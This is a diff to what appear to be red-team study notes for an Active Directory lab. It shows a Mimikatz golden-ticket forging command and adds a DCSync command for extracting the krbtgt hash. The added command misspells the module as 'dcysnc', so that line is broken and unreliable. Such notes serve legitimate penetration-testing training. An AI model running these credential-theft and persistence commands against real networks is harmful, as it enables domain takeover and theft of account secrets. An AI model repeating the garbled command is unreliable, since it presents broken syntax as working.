@@ -386,5 +386,9 @@ println "out> $sout err> $err"
 ```powershell
 Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:<sid> /krbtgt:<krbtgt> id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
 ```
+- To use the DCSync feature for getting krbtgt hash execute the below command with DA privileges:
+- `Invoke-Mimikatz -Command '"lsadump::dcysnc /user:dcorp\krbtgt"'`
+
+- Using the DCSync options needs no code execution (no need to run Invoke-Mimikatz) on the target DC.
 
 ## Domain Persistence Part 2
